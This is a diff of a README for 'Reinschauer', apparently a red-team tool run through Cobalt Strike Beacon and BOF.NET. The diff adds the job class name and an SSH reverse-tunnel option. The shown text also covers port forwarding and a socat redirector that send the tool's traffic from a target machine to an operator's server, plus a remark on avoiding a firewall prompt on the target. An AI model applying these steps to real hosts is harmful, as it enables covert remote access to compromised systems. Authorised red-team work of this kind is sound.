@@ -112,7 +112,7 @@ First, set up [BOF.NET](https://github.com/CCob/BOF.NET) according to the manual
 
 - Set the session to interactive: `sleep 0`.
 - Set up remote port forwarding: `rportfwd_local 6969 127.0.0.1 6969`.
-- Execute Reinschauer in background: `bofnet_job XXXXXX`. This automatically causes Reinschauer to connect to `127.0.0.1:6969` on `127.0.0.1` of the target machine. This also deactivates TLS, since it uses the Beacon connection anyway.
+- Execute Reinschauer in background: `bofnet_job reinschauer_dotnet.BofStuff`. This automatically causes Reinschauer to connect to `127.0.0.1:6969` on `127.0.0.1` of the target machine. This also deactivates TLS, since it uses the Beacon connection anyway.
 - To kill Reinschauer, use `bofnet_jobkill <Job ID>`.
 
 *Important note regarding remote port forwarding:* It seems that the `rportfwd_local` causes Beacon to listen on `0.0.0.0` and there seems to be no way to set it to `127.0.0.1` :/ This may trigger a Windows Firewall prompt on the system and that's not cool. If you don't want this, use another remote port forwarding solution for Cobaltstrike or use the following approach.
@@ -120,10 +120,13 @@ First, set up [BOF.NET](https://github.com/CCob/BOF.NET) according to the manual
 ### Sending Traffic to Another Server
 
 - Set the session to interactive: `sleep 0`.
-- Execute Reinschauer in background: `bofnet_job XXXXXX <Server IP> <Server Port> true`. The boolean parameter enabled TLS usage.
+- Execute Reinschauer in background: `bofnet_job reinschauer_dotnet.BofStuff <Server IP> <Server Port> true`. The boolean parameter enables TLS usage.
 - To kill Reinschauer, use `bofnet_jobkill <Job ID>`.
 
-Then, set up a `socat` redirector on the Server:
+
+Then, use SSH and the [GatewayPorts](https://man.openbsd.org/sshd_config#GatewayPorts) feature: Add `GatewayPorts: clientspecified` to `sshd_config` and restart the SSH server. Then, `ssh -R '0.0.0.0:8080:localhost:6969'' [...]` will make your local port `6969` available on `0.0.0.0:8080`. Then, start the client with the required parameters or hardcode them. Be careful :)
+
+or, set up a `socat` redirector on the Server:
 
 ```bash
 socat TCP4-LISTEN:<Server Port>,fork TCP4:127.0.0.1:6969
